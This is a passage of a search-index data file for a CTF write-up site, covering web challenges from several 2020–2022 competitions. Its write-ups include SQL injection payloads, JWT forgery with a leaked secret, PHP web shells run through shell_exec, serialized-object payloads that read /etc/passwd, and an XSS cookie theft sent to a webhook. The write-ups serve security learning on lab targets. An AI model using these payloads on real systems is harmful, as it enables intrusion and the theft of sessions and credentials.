xor(KEY1, KEY2, key3, key4, key5) print(flag.decode()) UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}","title":"speedrun-2"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#speedrun-2","text":"","title":"speedrun-2"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#description","text":"","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#solution","text":"Looking at the script it is obvious this is an SQLi. The course table does not seem to contain any values useful to us. Let's try searching for other tables: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27 http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this from pwn import xor KEY1 = bytes.fromhex(\"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76\") KEY2 = bytes.fromhex(\"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1\") key3 = bytes.fromhex(\"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c\") key4 = bytes.fromhex(\"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3\") key5 = bytes.fromhex(\"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35\") flag = xor(KEY1, KEY2, key3, key4, key5) print(flag.decode()) UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/","text":"Speedrun 3 Description link Solution First, we enter the site and randomly fill in the input We then refresh it and see {\"admin\":false,\"name\":\"asd\"} We also note that a cookie, named authtoken was created, with the value eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJhc2QifQ.i9II9riAxP5OSQrVDrRX2dOnNaJI_K4Vk9FED-ADuVs We play around with the cookie by deleting half of it, and was greeted with an error Fatal error: Uncaught UnexpectedValueException: Wrong number of segments in /var/www/html/index.php:84 Stack trace: #0 /var/www/html/index.php(531): Firebase\\JWT\\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 84 JWT When we google JWT decoder we get the link link We find that the format for the code is JWT::decode($payload, JWK::parseKeySet($jwks), $supportedAlgorithm); Hence, we input the 256-bit-secret as 82a59879a507 Now, it is verified Getting the flag We use the tool to change admin to true, and get eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFzZCJ9.YTbnlIIllCx5UyHp4N-M1f00hDl5erOGmq2V17N8RKg Flag is: UDCTF{st00p1d_PHP_err0r_mess4ges}","title":"Speedrun 3"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#speedrun-3","text":"","title":"Speedrun 3"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#description","text":"link","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#solution","text":"First, we enter the site and randomly fill in the input We then refresh it and see {\"admin\":false,\"name\":\"asd\"} We also note that a cookie, named authtoken was created, with the value eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJhc2QifQ.i9II9riAxP5OSQrVDrRX2dOnNaJI_K4Vk9FED-ADuVs We play around with the cookie by deleting half of it, and was greeted with an error Fatal error: Uncaught UnexpectedValueException: Wrong number of segments in /var/www/html/index.php:84 Stack trace: #0 /var/www/html/index.php(531): Firebase\\JWT\\JWT::decode('eyJ0eXAiOiJKV1Q...', '82a59879a507', Array) #1 {main} thrown in /var/www/html/index.php on line 84","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#jwt","text":"When we google JWT decoder we get the link link We find that the format for the code is JWT::decode($payload, JWK::parseKeySet($jwks), $supportedAlgorithm); Hence, we input the 256-bit-secret as 82a59879a507 Now, it is verified","title":"JWT"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#getting-the-flag","text":"We use the tool to change admin to true, and get eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZSwibmFtZSI6ImFzZCJ9.YTbnlIIllCx5UyHp4N-M1f00hDl5erOGmq2V17N8RKg","title":"Getting the flag"},{"location":"web/BlueHensCTF2021/speedrun-3/speed3/#flag-is","text":"UDCTF{st00p1d_PHP_err0r_mess4ges}","title":"Flag is:"},{"location":"web/DawgCTF20/freewifi2/","text":"FreeWifi2 There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: < JWT 'identity'=31337 > HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666 Ideas: I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'=\"dawgCTF?heckin#bamboozle\"; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Freewifi2"},{"location":"web/DawgCTF20/freewifi2/#freewifi2","text":"There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: < JWT 'identity'=31337 > HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&username=true.grit%40umbccd.io&password=true.grit%40umbccd.io&submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666","title":"FreeWifi2"},{"location":"web/DawgCTF20/freewifi2/#ideas","text":"I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'=\"dawgCTF?heckin#bamboozle\"; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Ideas:"},{"location":"web/TAMUctf2021/API2%3ATHE%20SEQUEL/THeSequel/","text":"This challenge was related to simple PostgreSQL. injection The VERSION() function returns the current version of the MySQL database, as a string which let's us know it's postgresql \"https://shell.tamuctf.com/problem/50034/?name=Cone%27%20union%20select%20%271%27,%20%272%27,%20%27safe%27,(CASE%20WHEN%20((SELECT%20CAST(CHR(32)\" we get the respective output from this. invalid input syntax for type numeric: \" 1 Default safe default testing icon avatar 2 Teddy euclid To please the teddy, one must offer them a sacrifice of your finest tea teddy 3 Traffic Cone #88192 neutralized We believe they appear from interdimensional rifts with no clear origin cone 4 Gnomial thaumiel If encountered in the wild do not make eye contact. They only become more aggressive. gnome 5 A\u0337\u030c\u0343d\u0334\u0357\u0352d\u0338\u035b\u035bi\u0337\u034b\u0303s\u0335\u0307\u030do\u0338\u031b\u0312n\u0336\u0307\u030c apollyon H\u0335\u0314\u0302E\u0335\u0307\u0308 \u0334\u031b\u033dI\u0335\u0358\u035bS\u0337\u0352\u0307 \u0337\u0344\u0312A\u0337\u030f\u035aL\u0334\u0340\u033fR\u0334\u033e\u030cE\u0337\u031a\u0346A\u0336\u0304\u031bD\u0337\u0312\u0310Y\u0336\u0357\u034c \u0337\u030f\u0314H\u0336\u033f\u031aE\u0336\u0303\u0304R\u0337\u0344\u035dE\u0338\u030a\u0344 crump 1 glenn 9651cbc7c0b5fb1a81f2858a07813c82 Making More Challenges 2 teddy e2ec2b31abe380b989ff057aef66377a PWNing Away 3 admin gigem{SQL_1nj3ct1ons_c4n_b3_fun} Away on Vacation \" as we can see the user name is thaumiel and hence we include it in our payload payload=\"Cone%27+Union+select+1,password,%27thaumiel%27,%27d%27,%27a%27+from+users--\" it allows to execute a fully formatted subquery within the injected part, which technically has almost the same impact as interacting with a pure PostgreSQL database. gigem{SQL_1nj3ct1ons_c4n_b3_fun}","title":"THeSequel"},{"location":"web/TAMUctf2021/uphpload/uphpload/","text":"uphpload Description Solution The webpage allows us to upload images and view them. This immediately suggests a file upload vulnerability. The page only accepts image files. This can be bypassed using a double extension. Upload a PHP script to search for flag.txt file: <?php print shell_exec('find / -name \"flag.txt\"'); ?> Click on the file in uploads to run the script. This gives us the flag location. Now upload a script to print the flag: <?php print shell_exec('cat /flag_is_here/flag.txt'); ?>","title":"uphpload"},{"location":"web/TAMUctf2021/uphpload/uphpload/#uphpload","text":"","title":"uphpload"},{"location":"web/TAMUctf2021/uphpload/uphpload/#description","text":"","title":"Description"},{"location":"web/TAMUctf2021/uphpload/uphpload/#solution","text":"The webpage allows us to upload images and view them. This immediately suggests a file upload vulnerability. The page only accepts image files. This can be bypassed using a double extension. Upload a PHP script to search for flag.txt file: <?php print shell_exec('find / -name \"flag.txt\"'); ?> Click on the file in uploads to run the script. This gives us the flag location. Now upload a script to print the flag: <?php print shell_exec('cat /flag_is_here/flag.txt'); ?>","title":"Solution"},{"location":"web/TamuCTF-2022/intro/","text":"Web Challenges from TamuCTF-2022 1.Lock-Out 2.Serial Killer","title":"Intro"},{"location":"web/TamuCTF-2022/Lock-Out/Lock-out/","text":"Lock Out Solved by: SriLakshmi Prathapan https://twitter.com/L0xm1_07 Description I seem to have locked myself out of my admin panel! Can you find a way back in for me? Do not connect with HTTPS, make sure to connect with HTTP Challenge Link: http://lockout.tamuctf.com Solution When we visit the link we can see the following page. Lets click on the login button When we click on the login button,we can see a login page with username and password. Since the goal of the challenge is to login as admin,I tried login using the username:admin and password:admin .I was not able to login and no error messages were displayed too. To check if it was vulnerable to sql injection tried fuzzing with \u2018,\u201d ,\\ etc but there weren\u2019t any error messages . Now I tried to intercept the request using burp with username:admin and password:admin From the above we can see that when we login ,the POST request is actually made to /admin.php. But in the response we can see that the response comes as a 302 redirect that the browser will follow back to the login page before ever rendering the page to the user. We can see a button PrintFlag on the admin page. Now since the browser respond with a 302 we could change the method to GET provide the PrintFlag as parameter ?PrintFlag=PrintFlag where PrintFlag is the name as well as value of the button. And yes we got the flag gigem{if_i_cant_wear_croc_martins_to_industry_night_then_im_not_going} Flag: gigem{if_i_cant_wear_croc_martins_to_industry_night_then_im_not_going}","title":"Lock Out"},{"location":"web/TamuCTF-2022/Lock-Out/Lock-out/#lock-out","text":"Solved by: SriLakshmi Prathapan https://twitter.com/L0xm1_07","title":"Lock Out"},{"location":"web/TamuCTF-2022/Lock-Out/Lock-out/#description","text":"I seem to have locked myself out of my admin panel! Can you find a way back in for me? Do not connect with HTTPS, make sure to connect with HTTP Challenge Link: http://lockout.tamuctf.com","title":"Description"},{"location":"web/TamuCTF-2022/Lock-Out/Lock-out/#solution","text":"When we visit the link we can see the following page. Lets click on the login button When we click on the login button,we can see a login page with username and password. Since the goal of the challenge is to login as admin,I tried login using the username:admin and password:admin .I was not able to login and no error messages were displayed too. To check if it was vulnerable to sql injection tried fuzzing with \u2018,\u201d ,\\ etc but there weren\u2019t any error messages . Now I tried to intercept the request using burp with username:admin and password:admin From the above we can see that when we login ,the POST request is actually made to /admin.php. But in the response we can see that the response comes as a 302 redirect that the browser will follow back to the login page before ever rendering the page to the user. We can see a button PrintFlag on the admin page. Now since the browser respond with a 302 we could change the method to GET provide the PrintFlag as parameter ?PrintFlag=PrintFlag where PrintFlag is the name as well as value of the button. And yes we got the flag gigem{if_i_cant_wear_croc_martins_to_industry_night_then_im_not_going} Flag: gigem{if_i_cant_wear_croc_martins_to_industry_night_then_im_not_going}","title":"Solution"},{"location":"web/TamuCTF-2022/Serial%20Killer/Serial%20Killer/","text":"Serial Killer Tamu CTF 2022 Challenge Description: I'm trying a new way to display files on my website. Can you try to break it for me? Do not connect with HTTPS, make sure to connect with HTTP Link: http://serial.tamuctf.com Tip: The flag is located in the /etc/passwd file. Solution: So the page looks something like this, So, when we checked the cookies, we saw phpsessid cookie with encoded value. Phpsessid: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D When I url decoded and base-64 decoded this string, we get the following: Url decoded: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30= Base-64 decoded: O:7:\"GetPage\":1:{s:4:\"file\";s:10:\"index.html\";} What we got is nothing but a serialised object. There is some block of code on the server called GetPage and it has a parameter called file that takes in a value index.html which is what we see in our browser. So, we are given that the flag is in etc/passwd . So, we can try giving etc/passwd in the place of index.html in the serialised object. So, the string looks like: O:7:\"GetPage\":1:{s:4:\"file\";s:11:\"/etc/passwd\";} We can base64 encode it and url encode it and submit in the phpsessid cookie, but we get an error message: O:7:\"GetPage\":1:{s:4:\"file\";s:26:\"system(\\'cat+/etc/passwd\\');\";} The above string also gave some error. Then we tried directory traversal and gave the following string: O:7:\"GetPage\":1:{s:4:\"file\";s:25:\"../../../../../etc/passwd\";} Surprisingly, the above string also gave an error, then tried url encoding ./../../../../etc/passwd and giving it into the serialised form, O:7:\"GetPage\":1:{s:4:\"file\";s:46:\"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd\";} Then base64 encoded and url encoded this and got the following: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6NDY6IiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZmV0Yy9wYXNzd2QiO30%3D Submitting this to the phpsessid cookie gave us the flag: Flag: gigem{1nt3r3sting\\_LFI\\_vuln}","title":"Serial Killer"},{"location":"web/TamuCTF-2022/Serial%20Killer/Serial%20Killer/#serial-killer","text":"","title":"Serial Killer"},{"location":"web/TamuCTF-2022/Serial%20Killer/Serial%20Killer/#tamu-ctf-2022","text":"","title":"Tamu CTF 2022"},{"location":"web/TamuCTF-2022/Serial%20Killer/Serial%20Killer/#challenge-description","text":"I'm trying a new way to display files on my website. Can you try to break it for me? Do not connect with HTTPS, make sure to connect with HTTP Link: http://serial.tamuctf.com Tip: The flag is located in the /etc/passwd file.","title":"Challenge Description:"},{"location":"web/TamuCTF-2022/Serial%20Killer/Serial%20Killer/#solution","text":"So the page looks something like this, So, when we checked the cookies, we saw phpsessid cookie with encoded value. Phpsessid: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D When I url decoded and base-64 decoded this string, we get the following: Url decoded: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30= Base-64 decoded: O:7:\"GetPage\":1:{s:4:\"file\";s:10:\"index.html\";} What we got is nothing but a serialised object. There is some block of code on the server called GetPage and it has a parameter called file that takes in a value index.html which is what we see in our browser. So, we are given that the flag is in etc/passwd . So, we can try giving etc/passwd in the place of index.html in the serialised object. So, the string looks like: O:7:\"GetPage\":1:{s:4:\"file\";s:11:\"/etc/passwd\";} We can base64 encode it and url encode it and submit in the phpsessid cookie, but we get an error message: O:7:\"GetPage\":1:{s:4:\"file\";s:26:\"system(\\'cat+/etc/passwd\\');\";} The above string also gave some error. Then we tried directory traversal and gave the following string: O:7:\"GetPage\":1:{s:4:\"file\";s:25:\"../../../../../etc/passwd\";} Surprisingly, the above string also gave an error, then tried url encoding ./../../../../etc/passwd and giving it into the serialised form, O:7:\"GetPage\":1:{s:4:\"file\";s:46:\"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd\";} Then base64 encoded and url encoded this and got the following: Tzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6NDY6IiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZmV0Yy9wYXNzd2QiO30%3D Submitting this to the phpsessid cookie gave us the flag: Flag: gigem{1nt3r3sting\\_LFI\\_vuln}","title":"Solution:"},{"location":"web/redpwnCTF2021/orm-bad/ormbad/","text":"orm-bad Description Looking at the source we can see that username needs to be admin to get the flag. app.post('/flag', (req, res) => { db.all(\"SELECT * FROM users WHERE username='\" + req.body.username + \"' AND password='\" + req.body.password + \"'\", (err, rows) => { try { if (rows.length == 0) { res.redirect(\"/?alert=\" + encodeURIComponent(\"you are not admin :(\")); } else if(rows[0].username === \"admin\") { res.redirect(\"/?alert=\" + encodeURIComponent(flag)); } else { res.redirect(\"/?alert=\" + encodeURIComponent(\"you are not admin :(\")); } } catch (e) { res.status(500).end(); } }) }) Solution The query is vulnerable to SQLi. Use -- after admin to comment out the rest of the query. This essentially removes the password check. SELECT * FROM users WHERE username=admin","title":"orm-bad"},{"location":"web/redpwnCTF2021/orm-bad/ormbad/#orm-bad","text":"","title":"orm-bad"},{"location":"web/redpwnCTF2021/orm-bad/ormbad/#description","text":"Looking at the source we can see that username needs to be admin to get the flag. app.post('/flag', (req, res) => { db.all(\"SELECT * FROM users WHERE username='\" + req.body.username + \"' AND password='\" + req.body.password + \"'\", (err, rows) => { try { if (rows.length == 0) { res.redirect(\"/?alert=\" + encodeURIComponent(\"you are not admin :(\")); } else if(rows[0].username === \"admin\") { res.redirect(\"/?alert=\" + encodeURIComponent(flag)); } else { res.redirect(\"/?alert=\" + encodeURIComponent(\"you are not admin :(\")); } } catch (e) { res.status(500).end(); } }) })","title":"Description"},{"location":"web/redpwnCTF2021/orm-bad/ormbad/#solution","text":"The query is vulnerable to SQLi. Use -- after admin to comment out the rest of the query. This essentially removes the password check. SELECT * FROM users WHERE username=admin","title":"Solution"},{"location":"web/redpwnCTF2021/pastebin-1/pastebin1/","text":"pastebin-1 Description In this challenge there is a pastebin service in which you can post your message and get a shareable link to your post. The admin bot will visit the URL you submit to it. Solution The pastebin executes any javascript passed to it. XSS is possible. We can leverage this to access the admin bot's cookie when it visits our URL. Setup a webhook to receive the request. Submit the link to our paste to the admin bot Javascript will try to load the image from the URL, passing cookie information along with it. URL decode to get the flag.","title":"pastebin-1"},{"location":"web/redpwnCTF2021/pastebin-1/pastebin1/#pastebin-1","text":"","title":"pastebin-1"},{"location":"web/redpwnCTF2021/pastebin-1/pastebin1/#description","text":"In this challenge there is a pastebin service in which you can post your message and get a shareable link to your post. The admin bot will visit the URL you submit to it.","title":"Description"},{"location":"web/redpwnCTF2021/pastebin-1/pastebin1/#solution","text":"The pastebin executes any javascript passed to it. XSS is possible. We can leverage this to access the admin bot's cookie when it visits our URL. Setup a webhook to receive the request. Submit the link to our paste to the admin bot Javascript will try to load the image from the URL, passing cookie information along with it. URL decode to get the flag.","title":"Solution"},{"location":"web/redpwnCTF2021/secure/secure/","text":"secure Description Any input you give on this page is converted to Base64 before passing. From the source we can see that username admin is encoded using btoa() before inserting. db.exec(`INSERT INTO users (username, password) VALUES ( '${btoa('admin')}', '${btoa(crypto.randomUUID)}' )`); Neither username nor password field can be empty. We will get the flag if the query returns any results. app.post('/login', (req, res) => { if (!req.body.username || !req.body.password) return res.redirect('/?message=Username and password required!'); const query = `SELECT id FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}';`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error('Incorrect login'); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } }); Solution The encoding is done on client-side using JavaScript. Any security mechanisms implemented on client-side is no security at all as it can easily be modified. Send a request with random values. Capture request using Burp. SQLi using password parameter. All ids will be returned and we will get the flag.","title":"secure"},{"location":"web/redpwnCTF2021/secure/secure/#secure","text":"","title":"secure"},{"location":"web/redpwnCTF2021/secure/secure/#description","text":"Any input you give on this page is converted to Base64 before passing. From the source we can see that username admin is encoded using btoa() before inserting. db.exec(`INSERT INTO users (username, password) VALUES ( '${btoa('admin')}', '${btoa(crypto.randomUUID)}' )`); Neither username nor password field can be empty. We will get the flag if the query returns any results. app.post('/login', (req, res) => { if (!req.body.username || !req.body.password) return res.redirect('/?message=Username and password required!'); const query = `SELECT id FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}';`; try { const id = db.prepare(query).get()?.id; if (id) return res.redirect(`/?message=${process.env.FLAG}`); else throw new Error('Incorrect login'); } catch { return res.redirect( `/?message=Incorrect username or password. Query: ${query}` ); } });","title":"Description"},{"location":"web/redpwnCTF2021/secure/secure/#solution","text":"The encoding is done on client-side using JavaScript. Any security mechanisms implemented on client-side is no security at all as it can easily be modified. Send a request with random values. Capture request using Burp. SQLi using password parameter. All ids will be returned and we will get the flag.","title":"Solution"}]}